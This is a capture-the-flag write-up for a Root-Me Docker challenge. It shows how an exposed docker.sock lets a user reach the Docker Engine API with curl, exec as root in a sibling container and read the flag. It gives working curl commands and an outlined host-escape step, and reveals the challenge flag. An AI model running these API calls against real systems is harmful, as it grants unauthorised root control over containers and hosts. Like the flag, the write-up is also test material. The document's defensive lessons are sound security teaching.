# Docker - Socket

**Platform:** Root-Me Pro
**Category:** System
**Difficulty:** Medium
**Points:** 450

## Challenge

> After discussing with the developers, they claim there's no risk in allowing
> any container to communicate with any other: "as long as it's between
> containers, it's secure." You're skeptical and want to prove this claim is
> false. The developers therefore provide you with SSH access to a container
> to demonstrate it.

SSH given into a container called `srv`, alongside a sibling container
`sysadmin` on the same Docker network.

## Approach

1. SSH'd into `srv` (`ssh -p 32494 srv@sockets.challenges.root-me.pro`).
2. `id` showed the `srv` user is a member of the `docker` group.
3. `/var/run/docker.sock` exists, owned `root:docker`, mode `rw` for the group
   — the container has been given a bind-mount of the host's Docker socket.
4. No `docker` CLI on the box, but `curl` was present, so talked to the Docker
   Engine API directly over the Unix socket:
   `curl --unix-socket /var/run/docker.sock http://localhost/<endpoint>`.
5. `GET /containers/json?all=true` listed both containers on the host —
   `srv` (this one) and `sysadmin`, which has no visible relationship or
   mount to `srv` beyond sharing a Docker network.
6. Used the Docker Exec API to run commands *inside* `sysadmin` — not via SSH,
   not via the network, but directly through the daemon:
   - `POST /containers/{sysadmin_id}/exec` with `Cmd: ["sh","-c","id; ls -la /root"]`
   - `POST /exec/{exec_id}/start` to run it and read the multiplexed output stream
   - Result: `uid=0(root)` inside `sysadmin`, and `/root/flag.txt` present.
7. Re-ran exec with `Cmd: ["cat","/root/flag.txt"]` to read the flag.

## Vulnerability

**Docker socket exposure inside a container = root on the whole Docker host,
not just "that container."** Mounting `/var/run/docker.sock` into a container
(or putting its user in the `docker` group with access to it) hands out
equivalent privileges to root on the host, because the Docker Engine API has
no notion of "only manage yourself" — any client on the socket can create,
exec into, inspect, or destroy *any* container the daemon manages, and can
trivially escape to the host filesystem by mounting `/` into a new privileged
container (not even needed here since `sysadmin` alone had the flag).

This directly disproves the developers' claim: `srv` and `sysadmin` never
exchanged a single network packet. The compromise path was entirely through
the shared Docker socket, bypassing whatever network-level isolation exists
between the containers.

## Solution

```bash
# enumerate
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true

# exec into the sysadmin container as root via the daemon
EID=$(curl -s --unix-socket /var/run/docker.sock -X POST \
  -H 'Content-Type: application/json' \
  http://localhost/containers/<sysadmin_id>/exec \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/root/flag.txt"]}' \
  | grep -o '"Id":"[a-f0-9]*"' | cut -d'"' -f4)

curl -s --unix-socket /var/run/docker.sock -X POST \
  -H 'Content-Type: application/json' \
  http://localhost/exec/$EID/start -d '{"Detach":false,"Tty":false}'
# response is docker's stream-multiplexed format (8-byte frame header),
# strip it to get the raw flag text
```

## Flag

`RM{5080a6ca5d26fd0dab3b74e2ea7e16a45132dc83}`

## Lesson

- Never mount `docker.sock` into a container, and never put low-trust users in
  the `docker` group — both are equivalent to giving root on the host.
- The Docker Engine API is a management plane, not a sandboxed one: anyone who
  can reach it can control every container and, from there, the host itself
  (`POST /containers/create` with `HostConfig.Binds: ["/:/host"]` + `chroot`
  is the standard next step for a full host filesystem escape).
- When enumerating a foothold, always check group memberships (`id`) and for
  `docker.sock` specifically — it's one of the most common and highest-impact
  container escapes in CTFs and real environments alike.
- No `docker` CLI needed: the raw HTTP API over the Unix socket via `curl
  --unix-socket` (or even raw `nc -U`) is enough to fully drive the daemon.
